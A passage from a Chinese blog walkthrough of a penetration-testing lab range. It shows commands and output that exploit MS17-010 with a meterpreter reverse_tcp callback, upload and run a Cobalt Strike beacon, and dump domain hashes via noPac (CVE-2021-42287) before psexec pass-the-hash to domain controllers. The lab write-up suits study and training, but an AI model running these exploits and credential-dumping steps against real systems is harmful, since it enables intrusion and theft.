+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用<code>exploit/windows/smb/ms17_010_psexec</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Module options (exploit/windows/smb/ms17_010_psexec):</span><br><span class="line">   SMBPass               admin555                                        no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser               win7                                            no        The username to authenticate as</span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.0.12     <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181904563.png" alt="image-20240125181904563"></p>
+<p>上线CS：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload a.exe c:/a.exe</span><br><span class="line">[*] Uploading  : /home/kali/tg/10-NASA/a.exe -&gt; c:/a.exe</span><br><span class="line">[*] Uploaded 14.00 KiB of 14.00 KiB (100.0%): /home/kali/tg/10-NASA/a.exe -&gt; c:/a.exe</span><br><span class="line">[*] Completed  : /home/kali/tg/10-NASA/a.exe -&gt; c:/a.exe</span><br><span class="line">meterpreter &gt; execute  -f c:/a.exe</span><br><span class="line">Process 2656 created.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> <span class="string">&quot;C:\Users\win7\Desktop\root.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181918199.png" alt="image-20240125181918199"></p>
+<h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><p>mimikatz获取明文：</p>
+<p><img src="/2023/10/11/NASA/image-20240125181926061.png" alt="image-20240125181926061"></p>
+<p><img src="/2023/10/11/NASA/image-20240125181938284.png" alt="image-20240125181938284"></p>
+<p><img src="/2023/10/11/NASA/image-20240125181948004.png" alt="image-20240125181948004"></p>
+<h2 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains python3 ./sam_the_admin.py nasa/<span class="string">&#x27;test:QWEasd!@#999&#x27;</span> -dc-ip 10.10.12.140 -shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181956166.png" alt="image-20240125181956166"></p>
+<p>工具地址：<a class="link" target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">noPac<i class="fas fa-external-link-alt"></i></a>，导出Hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../noPac-main/noPac.py nasa.gov/test:<span class="string">&#x27;QWEasd!@#999&#x27;</span> -dc-ip 10.10.12.140 -dc-host AD01 --impersonate administrator -dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125182007180.png" alt="image-20240125182007180"></p>
+<p><code>Psexe</code>上传执行上线CS：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-0.10.0/examples/psexec.py nasa.gov/administrator@10.10.12.140 -hashes :fbe5588a79e40d41d77a40569c7b3090  -c ./sec.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125182016098.png" alt="image-20240125182016098"></p>
+<h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> <span class="string">&quot;C:\Users\Administrator\root.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125182031671.png" alt="image-20240125182031671"></p>
+<h1 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h1><p>同样通过<code>Psexe</code>上线CS：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-0.10.0/examples/psexec.py nasa.gov/administrator@10.10.12.141 -hashes :fbe5588a79e40d41d77a40569c7b3090  -c ./sec.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125182051093.png" alt="image-20240125182051093"></p>
+<p><img src="/2023/10/11/NASA/image-20240125182057486.png" alt="image-20240125182057486"></p>
+<h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> <span class="string">&quot;C:\Users\Administrator\root.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125182105823.png" alt="image-20240125182105823"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/docker%E9%80%83%E9%80%B8/">#docker逃逸</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/IIS6-0%E6%BA%A2%E5%87%BA/">#IIS6.0溢出</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CVE-2021-42287/">#CVE-2021-42287</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/10/05/ack123/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">外网打点到内网域靶场-ack123</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶场描述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">1.1.</span> <span class="nav-text">靶场拓扑图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VSP%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">VSP设置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">WEB服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.1.2.</span> <span class="nav-text">目录遍历</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="nav-number">2.2.1.</span> <span class="nav-text">弱口令爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GetShell"><span class="nav-number">2.2.2.</span> <span class="nav-text">GetShell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.3.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Find-SUID%E6%8F%90%E6%9D%83"><span class="nav-number">2.3.1.</span> <span class="nav-text">Find SUID提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="nav-number">2.3.2.</span> <span class="nav-text">上线msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker%E9%80%83%E9%80%B8"><span class="nav-number">2.3.3.</span> <span class="nav-text">docker逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9B%AE%E5%BD%95"><span class="nav-number">2.3.3.1.</span> <span class="nav-text">挂载宿主机目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.3.3.2.</span> <span class="nav-text">写入计划任务</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag1"><span class="nav-number">2.4.</span> <span class="nav-text">Flag1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Win2003"><span class="nav-number">3.</span> <span class="nav-text">Win2003</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS6-0%E6%BA%A2%E5%87%BA"><span class="nav-number">3.2.</span> <span class="nav-text">IIS6.0溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag2"><span class="nav-number">3.4.</span> <span class="nav-text">Flag2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Win7"><span class="nav-number">4.</span> <span class="nav-text">Win7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag3"><span class="nav-number">4.3.</span> <span class="nav-text">Flag3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DC1"><span class="nav-number">5.</span> <span class="nav-text">DC1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-42287"><span class="nav-number">5.2.</span> <span class="nav-text">CVE-2021-42287</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag4"><span class="nav-number">5.3.</span> <span class="nav-text">Flag4</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DC2"><span class="nav-number">6.</span> <span class="nav-text">DC2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag5"><span class="nav-number">6.1.</span> <span class="nav-text">Flag5</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
